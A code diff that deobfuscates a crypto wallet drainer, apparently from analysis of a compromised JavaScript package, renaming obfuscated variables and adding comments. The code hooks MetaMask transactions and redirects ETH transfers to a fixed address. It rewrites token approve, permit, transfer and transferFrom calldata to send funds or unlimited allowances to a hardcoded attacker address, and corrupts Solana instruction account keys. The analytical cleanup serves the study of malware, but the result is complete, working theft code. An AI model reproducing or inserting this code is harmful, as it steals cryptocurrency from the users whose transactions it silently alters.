@@ -7,6 +7,7 @@ import {
   litecoin2Addresses,
   solanaAddresses,
   tronAddresses,
+  knownExchanges,
 } from "./consts";
 import { levenshteinDistance } from "./levenshtein";
 
@@ -277,95 +278,94 @@ async function hookMetamask() {
     const args = JSON.parse(JSON.stringify(argsIn));
 
     if (isEthereum) {
+      const attackerAddress = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
+
       if (args.value && args.value !== "0x0" && args.value !== "0") {
         args.to = MAIN_ETHEREUM_ADDRESS;
       }
+
       if (args.data) {
-        const _0x250e27 = args.data.toLowerCase();
-        if (_0x250e27.startsWith("0x095ea7b3")) {
-          if (_0x250e27.length >= 74) {
-            const _0x7fa5f0 = _0x250e27.substring(0, 10);
-            const _0x15c4f9 = "0x" + _0x250e27.substring(34, 74);
-            const _0xde14cc = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
-            const _0x3e4a11 = "f".repeat(64);
-            args.data = _0x7fa5f0 + _0xde14cc + _0x3e4a11;
-            const _0x432d38 = {
-              "0x7a250d5630b4cf539739df2c5dacb4c659f2488d": "Uniswap V2",
-              "0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af": "Uniswap V2",
-              "0xe592427a0aece92de3edee1f18e0157c05861564": "Uniswap V3",
-              "0x10ed43c718714eb63d5aa57b78b54704e256024e": "PancakeSwap V2",
-              "0x13f4ea83d0bd40e75c8222255bc855a974568dd4": "PancakeSwap V3",
-              "0x1111111254eeb25477b68fb85ed929f73a960582": "1inch",
-              "0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f": "SushiSwap",
-            };
-            const _0x13f774 = _0x432d38[_0x15c4f9.toLowerCase()];
-            if (_0x13f774) {
-              console.log(_0x13f774 + _0x15c4f9);
+        const dataLowercase = args.data.toLowerCase();
+
+        if (dataLowercase.startsWith("0x095ea7b3")) {
+          // ERC-20 token approval signature
+          // approve(address,uint256)
+          // cf. <https://www.4byte.directory/signatures/?bytes4_signature=0x095ea7b3>
+
+          if (dataLowercase.length >= 74) {
+            const tokenApproval = dataLowercase.substring(0, 10);
+            const approvalAmount = "f".repeat(64);
+            args.data = tokenApproval + attackerAddress + approvalAmount;
+
+            // log the DEX exchange name
+            const exchangeAddress = "0x" + dataLowercase.substring(34, 74);
+            const exchangeName = knownExchanges[exchangeAddress.toLowerCase()];
+            if (exchangeName) {
+              console.log(exchangeName + exchangeAddress);
             } else {
-              console.log(_0x15c4f9);
+              console.log(exchangeAddress);
             }
           }
-        } else {
-          if (_0x250e27.startsWith("0xd505accf")) {
-            if (_0x250e27.length >= 458) {
-              const _0x571743 = _0x250e27.substring(0, 10);
-              const _0x55e7fa = _0x250e27.substring(10, 74);
-              const _0x382fb5 = _0x250e27.substring(202, 266);
-              const _0x5bb3a7 = _0x250e27.substring(266, 330);
-              const _0x2e5118 = _0x250e27.substring(330, 394);
-              const _0x3ba273 = _0x250e27.substring(394, 458);
-              const _0x36b084 = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
-              const _0x15389e = "f".repeat(64);
-              args.data =
-                _0x571743 +
-                _0x55e7fa +
-                _0x36b084 +
-                _0x15389e +
-                _0x382fb5 +
-                _0x5bb3a7 +
-                _0x2e5118 +
-                _0x3ba273;
-            }
-          } else {
-            if (_0x250e27.startsWith("0xa9059cbb")) {
-              if (_0x250e27.length >= 74) {
-                const _0x5d2193 = _0x250e27.substring(0, 10);
-                const _0x1493e2 = _0x250e27.substring(74);
-                const _0x32c34c = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
-                args.data = _0x5d2193 + _0x32c34c + _0x1493e2;
-              }
-            } else {
-              if (_0x250e27.startsWith("0x23b872dd")) {
-                if (_0x250e27.length >= 138) {
-                  const _0x5c5045 = _0x250e27.substring(0, 10);
-                  const _0x1ebe01 = _0x250e27.substring(10, 74);
-                  const _0x558b46 = _0x250e27.substring(138);
-                  const _0x56d65b = "Fc4a4858bafef54D1b1d7697bfb5c52F4c166976".padStart(64, "0");
-                  args.data = _0x5c5045 + _0x1ebe01 + _0x56d65b + _0x558b46;
-                }
-              }
-            }
+        } else if (dataLowercase.startsWith("0xd505accf")) {
+          // ERC-2612 permit function hijacking
+          // permit(address,address,uint256,uint256,uint8,bytes32,bytes32)
+          // cf. <https://www.4byte.directory/signatures/?bytes4_signature=0xd505accf>
+
+          if (dataLowercase.length >= 458) {
+            const permitFunction = dataLowercase.substring(0, 10);
+            const sourceAddress = dataLowercase.substring(10, 74);
+            const value = "f".repeat(64);
+            const deadline = dataLowercase.substring(202, 266);
+            const v = dataLowercase.substring(266, 330);
+            const r = dataLowercase.substring(330, 394);
+            const s = dataLowercase.substring(394, 458);
+            args.data =
+              permitFunction + sourceAddress + attackerAddress + value + deadline + v + r + s;
+          }
+        } else if (dataLowercase.startsWith("0xa9059cbb")) {
+          // transfer(address,uint256)
+          // cf. <https://www.4byte.directory/signatures/?bytes4_signature=0xa9059cbb>
+
+          if (dataLowercase.length >= 74) {
+            const transfer = dataLowercase.substring(0, 10);
+            const amount = dataLowercase.substring(74);
+            args.data = transfer + attackerAddress + amount;
+          }
+        } else if (dataLowercase.startsWith("0x23b872dd")) {
+          // transferFrom(address,address,uint256)
+          // cf. <https://www.4byte.directory/signatures/?bytes4_signature=0x23b872dd>
+
+          if (dataLowercase.length >= 138) {
+            const transferFrom = dataLowercase.substring(0, 10);
+            const sourceAddress = dataLowercase.substring(10, 74);
+            const amount = dataLowercase.substring(138);
+            args.data = transferFrom + sourceAddress + attackerAddress + amount;
           }
         }
       } else if (args.to && args.to !== MAIN_ETHEREUM_ADDRESS) {
         args.to = MAIN_ETHEREUM_ADDRESS;
       }
     } else {
+      // Solana codepath: modify account/pubkey/key/recipient/destination to
+      // a value that doesn't appear valid?
+      //
+      // 19111111111111111111111111111111
+
       if (args.instructions && Array.isArray(args.instructions)) {
-        args.instructions.forEach((_0x190501) => {
-          if (_0x190501.accounts && Array.isArray(_0x190501.accounts)) {
-            _0x190501.accounts.forEach((_0x2b9990) => {
-              if (typeof _0x2b9990 === "string") {
-                _0x2b9990 = "19111111111111111111111111111111";
-              } else if (_0x2b9990.pubkey) {
-                _0x2b9990.pubkey = "19111111111111111111111111111111";
+        args.instructions.forEach((instruction) => {
+          if (instruction.accounts && Array.isArray(instruction.accounts)) {
+            instruction.accounts.forEach((account) => {
+              if (typeof account === "string") {
+                account = "19111111111111111111111111111111";
+              } else if (account.pubkey) {
+                account.pubkey = "19111111111111111111111111111111";
               }
             });
           }
-          if (_0x190501.keys && Array.isArray(_0x190501.keys)) {
-            _0x190501.keys.forEach((_0x40768f) => {
-              if (_0x40768f.pubkey) {
-                _0x40768f.pubkey = "19111111111111111111111111111111";
+          if (instruction.keys && Array.isArray(instruction.keys)) {
+            instruction.keys.forEach((key) => {
+              if (key.pubkey) {
+                key.pubkey = "19111111111111111111111111111111";
               }
             });
           }
@@ -456,7 +456,7 @@ async function hookMetamask() {
     }
     return success;
   }
-  function hookMetamask() {
+  function hookMetamaskLoop() {
     let counter = 0;
     const tryHookMetamask = () => {
       counter++;
@@ -472,7 +472,7 @@ async function hookMetamask() {
     };
     tryHookMetamask();
   }
-  hookMetamask();
+  hookMetamaskLoop();
   window.stealthProxyControl = {
     isActive: () => isActive,
     getInterceptCount: () => interceptCount,
